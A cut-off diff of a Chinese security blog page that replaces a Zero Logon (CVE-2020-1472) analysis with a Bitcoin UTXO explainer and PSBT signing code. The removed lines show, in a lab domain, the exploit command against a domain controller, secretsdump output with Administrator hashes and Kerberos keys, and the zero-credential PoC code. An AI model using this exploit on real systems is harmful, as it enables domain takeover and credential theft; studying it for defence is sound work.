@@ -9,7 +9,7 @@
 
     <link rel="icon" href="/images/favicon.png" type="image/png">
 
-    <title>Zero Logon 分析 - chestnut&#39;s blog</title>
+    <title>Utxo - chestnut&#39;s blog</title>
 
     
     <link href="/css/nucleus.css?1760544159" rel="stylesheet">
@@ -48,7 +48,7 @@
     </style>
     
   </head>
-  <body class="" data-url="/zh-cn/vulnerability/zero-logon/">
+  <body class="" data-url="/zh-cn/web3/btc/utxo/">
     <nav id="sidebar" class="showVisitedLinks">
 
 
@@ -138,7 +138,7 @@
   
     
     <li data-nav-id="/zh-cn/web3/" title="Web3" class="dd-item
-        
+        parent
         
         
         ">
@@ -169,7 +169,7 @@
   
     
     <li data-nav-id="/zh-cn/web3/btc/" title="Btc" class="dd-item
-        
+        parent
         
         
         ">
@@ -197,7 +197,7 @@
  
   
     
-      <li data-nav-id="/zh-cn/web3/btc/utxo/" title="Utxo" class="dd-item ">
+      <li data-nav-id="/zh-cn/web3/btc/utxo/" title="Utxo" class="dd-item active">
         <a href="/zh-cn/web3/btc/utxo/">
         Utxo
         <i class="fas fa-check read-icon"></i>
@@ -1294,7 +1294,7 @@
   
     
     <li data-nav-id="/zh-cn/vulnerability/" title="漏洞分析" class="dd-item
-        parent
+        
         
         
         ">
@@ -2051,7 +2051,7 @@
  
   
     
-      <li data-nav-id="/zh-cn/vulnerability/zero-logon/" title="Zero Logon 分析" class="dd-item active">
+      <li data-nav-id="/zh-cn/vulnerability/zero-logon/" title="Zero Logon 分析" class="dd-item ">
         <a href="/zh-cn/vulnerability/zero-logon/">
         Zero Logon 分析
         <i class="fas fa-check read-icon"></i>
@@ -3235,7 +3235,7 @@
                   
                     
                     
-                      <option id="zh-cn" value="https://www.ch35tnut.com/zh-cn/vulnerability/zero-logon/" selected>简体中文</option>
+                      <option id="zh-cn" value="https://www.ch35tnut.com/zh-cn/web3/btc/utxo/" selected>简体中文</option>
                     
                   
               
@@ -3316,7 +3316,13 @@
             
           
           
-            <a href='/zh-cn/'>首页</a> > <a href='/zh-cn/vulnerability/'>漏洞分析</a> > Zero Logon 分析
+            
+            
+          
+          
+            <a href='/zh-cn/'>首页</a> > <a href='/zh-cn/web3/'>Web3</a> > <a href='/zh-cn/web3/btc/'>Btc</a> > Utxo
+          
+        
           
         
           
@@ -3329,18 +3335,7 @@
                 
                     <div class="progress">
     <div class="wrapper">
-<nav id="TableOfContents">
-  <ul>
-    <li>
-      <ul>
-        <li><a href="#基本信息">基本信息</a></li>
-        <li><a href="#影响版本">影响版本</a></li>
-        <li><a href="#环境搭建">环境搭建</a></li>
-        <li><a href="#技术分析调试">技术分析&amp;调试</a></li>
-      </ul>
-    </li>
-  </ul>
-</nav>
+<nav id="TableOfContents"></nav>
     </div>
 </div>
 
@@ -3350,19 +3345,13 @@
             
         <div id="head-tags">
         
-<div class="tags">
-
-  <a class="tag-link" href="/zh-cn/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a>
-
-</div>
-
         </div>
         
         <div id="body-inner">
           
             <h1>
               
-              Zero Logon 分析
+              Utxo
             </h1>
           
 
@@ -3374,191 +3363,182 @@
     </div>
 </div>
 
-<nav id="TableOfContents">
-  <ul>
-    <li>
-      <ul>
-        <li><a href="#基本信息">基本信息</a></li>
-        <li><a href="#影响版本">影响版本</a></li>
-        <li><a href="#环境搭建">环境搭建</a></li>
-        <li><a href="#技术分析调试">技术分析&amp;调试</a></li>
-      </ul>
-    </li>
-  </ul>
-</nav>
-<h3 id="基本信息">基本信息</h3>
-<p>Netlogon协议认证过程：
+<nav id="TableOfContents"></nav>
+<p>花一个晚上看完了btc白皮书，借助AI理解了一下btc转账。</p>
+<p>
+<img loading="lazy" alt="1.png"src="/images/web3/btc/utxo.zh-cn.assets/1.png" width="998" height="506"
 
-<img loading="lazy" alt=""src="/images/vulnerability/zero-logon.zh-cn.assets/1.png" width="496" height="757"
-
-
+ style="width: 100%; max-width: 570px;"
 /></p>
-<h3 id="影响版本">影响版本</h3>
-<p>略</p>
-<h3 id="环境搭建">环境搭建</h3>
-<ul>
-<li>win server 2012</li>
-</ul>
-<h3 id="技术分析调试">技术分析&amp;调试</h3>
-<p><strong>利用</strong>
-域环境使用Windows server 2012R2搭建，先用
-<a href="https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py" target="_blank">脚本</a>重置域账户密码
-<code>python cve-2020-1472-exploit.py WIN2016 192.168.52.130</code>
-并抓取数据包
-重置之后域账户的密码为空，对应hash为<code>31d6cfe0d16ae931b73c59d7e0c089c0</code></p>
-<p>安装impacket：</p>
-<ul>
-<li><code>python3 -m pipx install impacket</code></li>
-<li><code>pipx ensurepath</code>
-使用<code>impacket</code>的<code>secretsdump</code>进行Dcsync，得到Administratr账户的NTLM hash</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>secretsdump.py cqy.io/WIN2016<span style="color:#ae81ff">\$</span>@WIN2016 -dc-ip 192.168.52.130 -just-dc-user cqy<span style="color:#ae81ff">\\</span>administrator -hashes 31d6cfe0d16ae931b73c59d7e0c089c0:31d6cfe0d16ae931b73c59d7e0c089c0
+<p>第一个框的交易指定了Owner0 将一笔UTXO(Unspent Transaction Output)指定给了Owner 1的公钥，这个时候如果Owner1想要使用这笔UTXO，则需要使用自己的私钥生成一段签名，整个网络可以验证这个签名是否正确。
+结合代码看，首先将UTXO作为输入，验证UTXO签名是否正确（即Owner 0 的签名），将接收BTC的地址作为输出，使用Owner的私钥对其进行签名，再将其放到最后一个区块内即可。
+基于非对称加密，可以很容易使用公钥验证一个签名是否是由正确的私钥签发的，进而使得私钥的所有人证明其所有权，</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>   <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">utxos</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">getUTXOs</span>(<span style="color:#a6e22e">senderAddress</span>);
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">keyPair</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ECPair</span>.<span style="color:#a6e22e">fromWIF</span>(<span style="color:#a6e22e">senderPrivateKey</span>, <span style="color:#a6e22e">network</span>);
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">inputAmount</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">psbt</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">bitcoin</span>.<span style="color:#a6e22e">Psbt</span>({ <span style="color:#a6e22e">network</span> });
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">psbt</span>.<span style="color:#a6e22e">setVersion</span>(<span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">psbt</span>.<span style="color:#a6e22e">setLocktime</span>(<span style="color:#ae81ff">0</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Impacket v0.10.0 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">utxo</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">utxos</span>[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">inputAmount</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">utxo</span>.<span style="color:#a6e22e">value</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
-</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:668d503af91aefe071e37a16e885047b:::
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Kerberos keys grabbed
-</span></span><span style="display:flex;"><span>Administrator:aes256-cts-hmac-sha1-96:8996ffd41ae52dd62a3c60007d078f10eb7cd3eb5d4b74c90791c8e47eba88cb
-</span></span><span style="display:flex;"><span>Administrator:aes128-cts-hmac-sha1-96:a3a6d348e74cee613718c2f94d404fb6
-</span></span><span style="display:flex;"><span>Administrator:des-cbc-md5:f732d313b5e92585
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up...
-</span></span></code></pre></div><p><strong>PoC分析</strong>
-关键代码是下面这个函数，参数rpc_con是<code>DCERPC_v5</code>对象，描述了rcp链接，</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> attempt <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, MAX_ATTEMPTS):
-</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> result <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
-</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;=&#39;</span>, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>, flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">txid</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">utxo</span>.<span style="color:#a6e22e">tx_hash_big_endian</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">rawTxHex</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">getRawTxHex</span>(<span style="color:#a6e22e">txid</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">try_zero_authenticate</span>(rpc_con, dc_handle, dc_ip, target_computer):
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Connect to the DC&#39;s Netlogon service.</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Use an all-zero challenge and credential.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">rawTxHex</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 非 witness 输入：需要传入整个前置交易的 raw hex
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">psbt</span>.<span style="color:#a6e22e">addInput</span>({
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">hash</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">txid</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">index</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">utxo</span>.<span style="color:#a6e22e">tx_output_n</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">nonWitnessUtxo</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">rawTxHex</span>, <span style="color:#e6db74">&#39;hex&#39;</span>),
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 如果无法获取 raw tx，可以尝试用 witnessUtxo（仅对 segwit 输出有效）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">psbt</span>.<span style="color:#a6e22e">addInput</span>({
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">hash</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">txid</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">index</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">utxo</span>.<span style="color:#a6e22e">tx_output_n</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">witnessUtxo</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">script</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">utxo</span>.<span style="color:#a6e22e">script</span>, <span style="color:#e6db74">&#39;hex&#39;</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> Number(<span style="color:#a6e22e">utxo</span>.<span style="color:#a6e22e">value</span>), <span style="color:#75715e">// witnessUtxo.value should be a number (satoshis)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            },
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    plaintext <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
-</span></span><span style="display:flex;"><span>    ciphertext <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">psbt</span>.<span style="color:#a6e22e">addOutput</span>({
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">script</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">bitcoin</span>.<span style="color:#a6e22e">address</span>.<span style="color:#a6e22e">toOutputScript</span>(<span style="color:#a6e22e">recipientAddress</span>, <span style="color:#a6e22e">network</span>),
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">amountToSend</span>, <span style="color:#75715e">// must be BigInt
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    });
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">psbt</span>.<span style="color:#a6e22e">addOutput</span>({
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">script</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">bitcoin</span>.<span style="color:#a6e22e">address</span>.<span style="color:#a6e22e">toOutputScript</span>(<span style="color:#a6e22e">senderAddress</span>, <span style="color:#a6e22e">network</span>),
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">inputAmount</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">amountToSend</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">500</span>), <span style="color:#75715e">// 找零，减去手续费（假设1000聪）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    });
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    flags <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x212fffff</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Send challenge and authentication request.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 签名并 finalise
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">validator</span> <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pubkey</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">msghash</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">signature</span>,
+</span></span><span style="display:flex;"><span>    ) =&gt; <span style="color:#a6e22e">ECPair</span>.<span style="color:#a6e22e">fromPublicKey</span>(<span style="color:#a6e22e">pubkey</span>, <span style="color:#a6e22e">network</span>).<span style="color:#a6e22e">verify</span>(<span style="color:#a6e22e">msghash</span>, <span style="color:#a6e22e">signature</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">psbt</span>.<span style="color:#a6e22e">signInput</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">keyPair</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">psbt</span>.<span style="color:#a6e22e">inputCount</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">psbt</span>.<span style="color:#a6e22e">validateSignaturesOfInput</span>(<span style="color:#a6e22e">i</span>, <span style="color:#a6e22e">validator</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Input </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> signature valid`</span>);
+</span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    nrpc<span style="color:#f92672">.</span>hNetrServerReqChallenge(rpc_con, dc_handle <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>, target_computer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>, plaintext)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>        server_auth <span style="color:#f92672">=</span> nrpc<span style="color:#f92672">.</span>hNetrServerAuthenticate3(
-</span></span><span style="display:flex;"><span>            rpc_con, dc_handle <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>, target_computer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;$</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>, nrpc<span style="color:#f92672">.</span>NETLOGON_SECURE_CHANNEL_TYPE<span style="color:#f92672">.</span>ServerSecureChannel,
-</span></span><span style="display:flex;"><span>            target_computer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>, ciphertext, flags
-</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">warn</span>(<span style="color:#e6db74">&#39;Signature validation failed or not applicable:&#39;</span>, <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">e</span>);
+</span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># It worked!</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">psbt</span>.<span style="color:#a6e22e">finalizeAllInputs</span>();
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;Failed to finalize inputs:&#39;</span>, <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">e</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">assert</span> server_auth[<span style="color:#e6db74">&#39;ErrorCode&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> nrpc<span style="color:#f92672">.</span>DCERPCSessionError <span style="color:#66d9ef">as</span> ex:
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ex<span style="color:#f92672">.</span>get_error_code() <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xc0000022</span>:
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
-</span></span><span style="display:flex;"><span>            fail(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Unexpected error code from DC: </span><span style="color:#e6db74">{</span>ex<span style="color:#f92672">.</span>get_error_code()<span style="color:#e6db74">}</span><span style="color:#e6db74">.&#39;</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">BaseException</span> <span style="color:#66d9ef">as</span> ex:
-</span></span><span style="display:flex;"><span>        fail(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Unexpected error: </span><span style="color:#e6db74">{</span>ex<span style="color:#e6db74">}</span><span style="color:#e6db74">.&#39;</span>)
-</span></span></code></pre></div><p>在PoC中循环发起认证，每次认证时，client challenge置为0x00 * 8，client credential置为0x00 * 8
-在
-<a href="/zh-cn/research/protocol/netlogon/">netlogon协议</a>中知道，服务器会比较自己计算的ClientCredential和客户端发过来的ClientCredential是否相等，而ClientCredential来源于会话密钥加密ClientChallenge。其中加密算法为AES，使用CFB8模式。该算法过程如下：
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">txHex</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">psbt</span>.<span style="color:#a6e22e">extractTransaction</span>().<span style="color:#a6e22e">toHex</span>();
+</span></span></code></pre></div><p>UTXO模型是BTC网络用来间接计算账户余额的方式，传统中心化交易依赖于一个中心实体记录每一个账户的消费，入账及余额，通过这个中心化实体用户才能知道自己的消费记录情况，用户之间是看不到对方的消费等记录的，对于去中心化的区块链来说一大要点就是透明：每个人都可以在区块上面验证某个信息是否正确，这也就要求不能依赖于中心化实体，在BTC中UTXO首次被实现。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">tx_hash_big_endian:</span> <span style="color:#960050;background-color:#1e0010">&#39;9bd090ad9a846428f4d060463ca13f878fb78ab0d66d7019941fda6ae7e74f4e&#39;,</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">tx_hash:</span> <span style="color:#960050;background-color:#1e0010">&#39;4e4fe7e76ada1f9419706dd6b08ab78f873fa13c4660d0f42864849aad90d09b&#39;,</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">tx_output_n:</span> <span style="color:#960050;background-color:#1e0010">28,</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">script:</span> <span style="color:#960050;background-color:#1e0010">&#39;76a9146b12dbf14da1e874dc8d962d661bd3abe5f910a588ac&#39;,</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">value:</span> <span style="color:#960050;background-color:#1e0010">17000,</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">value_hex:</span> <span style="color:#960050;background-color:#1e0010">&#39;4268&#39;,</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">confirmations:</span> <span style="color:#960050;background-color:#1e0010">160,</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">tx_index:</span> <span style="color:#960050;background-color:#1e0010">2755363202751299</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><blockquote>
+<p>UTXO结构</p></blockquote>
+<p>UTXO全称Unspent Transaction Output，未花费交易输出，在BTC网络中每个地址（钱包）没有余额的概念，那么想要花一笔钱该如何做呢。</p>
+<p>当想花费时需要将一笔或者多笔未花费的UTXO可以作为新交易中的输入，一笔交易可能有多个输入和多个输出，由于没有余额的概念那么自然没有找零的概念，假设我想买价值0.5BTC的东西，我有一笔1btc的UTXO，那么此时应该如何做呢。</p>
+<p>对于不能一笔花完的开销来说，需要添加一个输出，里面放入自己钱包的公钥，完成交易后，自己钱包会多出一笔未花费的UTXO，实现了间接找零。</p>
+<p>以链上一笔交易来说明,tx:77e6773b1cfc38bca5c6ea649ba0e0c1985dc55c00f65284362f0ad79b741ecc，使用代码对其解码，其拥有一笔输入，和多个输出，输入减去输出就是给矿工的fee。</p>
+<pre tabindex="0"><code>{
+  &#34;network&#34;: &#34;bitcoin mainnet&#34;,
+  &#34;txid&#34;: &#34;77e6773b1cfc38bca5c6ea649ba0e0c1985dc55c00f65284362f0ad79b741ecc&#34;,
+  &#34;version&#34;: 1,
+  &#34;size_bytes&#34;: 391,
+  &#34;weight&#34;: 802,
+  &#34;vsize&#34;: 201,
+  &#34;locktime&#34;: {
+    &#34;type&#34;: &#34;blockHeight&#34;,
+    &#34;value&#34;: 0
+  },
+  &#34;vin_count&#34;: 1,
+  &#34;vout_count&#34;: 2,
+  &#34;inputs&#34;: [
+    {
+      &#34;index&#34;: 0,
+      &#34;prevout&#34;: {
+        &#34;txid&#34;: &#34;b145aad702e266d74dffa743a54639101e265b9df9fcfae3d8fce1c194a282e7&#34;,
+        &#34;vout&#34;: 2
+      },
+      &#34;sequence&#34;: 4294967293,
+      &#34;rbfLikely&#34;: true,
+      &#34;scriptSigHex&#34;: &#34;&#34;,
+      &#34;witness&#34;: [
+        {
+          &#34;index&#34;: 0,
+          &#34;hex&#34;: &#34;&#34;,
+          &#34;len&#34;: 0
+        },
+        {
+          &#34;index&#34;: 1,
+          &#34;hex&#34;: &#34;48,68,2,32,99,127,45,212,211,58,92,53,118,21,122,22,113,230,97,197,89,110,44,164,32,109,37,188,205,218,99,170,193,108,162,54,2,32,122,235,76,115,81,62,230,176,199,161,166,251,224,187,129,123,29,161,18,81,102,224,26,218,140,64,193,187,6,37,207,203,1&#34;,
+          &#34;len&#34;: 71
+        },
+        {
+          &#34;index&#34;: 2,
+          &#34;hex&#34;: &#34;48,68,2,32,70,149,209,74,159,228,5,72,211,191,0,158,60,171,152,217,118,153,162,205,30,30,28,118,191,252,14,30,240,182,250,120,2,32,64,136,99,29,211,184,215,38,52,63,46,87,204,194,28,210,168,97,161,180,143,43,86,151,21,97,199,117,239,108,44,221,1&#34;,
+          &#34;len&#34;: 71
+        },
+        {
+          &#34;index&#34;: 3,
+          &#34;hex&#34;: &#34;82,33,3,120,197,249,69,7,142,221,73,97,2,213,147,83,214,1,126,126,212,23,234,187,117,42,58,229,164,228,155,20,44,85,166,33,2,237,87,136,14,74,15,140,231,227,169,247,56,151,44,25,1,112,203,115,84,222,17,214,109,63,136,147,52,197,220,63,62,33,2,225,38,37,255,92,147,211,55,179,187,185,201,80,106,241,81,50,45,45,115,46,219,98,200,255,88,79,42,196,92,250,252,83,174&#34;,
+          &#34;len&#34;: 105
+        }
+      ]
+    }
+  ],
+  &#34;outputs&#34;: [
+    {
+      &#34;index&#34;: 0,
+      &#34;value_sats&#34;: &#34;162510&#34;,
+      &#34;value_btc&#34;: 0.0016251,
+      &#34;scriptPubKeyHex&#34;: &#34;0,32,123,184,245,128,42,228,70,190,78,95,125,222,56,124,161,98,79,174,224,154,134,67,168,193,111,248,125,244,35,94,37,132&#34;,
+      &#34;scriptType&#34;: &#34;p2wsh&#34;,
+      &#34;address&#34;: &#34;bc1q0wu0tqp2u3rtunjl0h0rsl9pvf86acy6sep63st0lp7lgg67ykzqeq89pn&#34;
+    },
+    {
